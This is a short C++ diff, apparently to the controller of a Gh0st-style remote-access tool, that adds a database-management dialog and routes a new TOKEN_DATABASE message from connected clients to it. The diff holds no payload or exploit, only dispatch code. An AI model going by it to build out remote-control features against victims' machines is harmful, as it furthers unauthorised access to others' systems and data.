@@ -24,6 +24,7 @@
 #include "UPDATEIP.h"
 //#include "Batch.h"
 #include "RegDlg.h"
+#include "DBManagerDlg.h"		//数据库管理
 #include "User.h"
 //#include "Play.h"
 #include "proxy.h"
@@ -651,6 +652,9 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 		case USER_DLG:
             ((CUser *)dlg)->OnReceiveComplete();  //服务器
 			break;
+		case DATABASE_DLG:
+			((CDBManagerDlg *)dlg)->OnReceiveComplete();  //服务器
+			break;
 		default:
 			break;
 		}
@@ -716,6 +720,9 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_USER_LIST:   //服务器管理    
 		g_pConnectView->PostMessage(WM_OPENRUSERGDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_DATABASE:   //数据库管理    
+		g_pConnectView->PostMessage(WM_OPENDATABASEDIALOG, 0, (LPARAM)pContext);
 		break;
 	default:
 		closesocket(pContext->m_Socket);
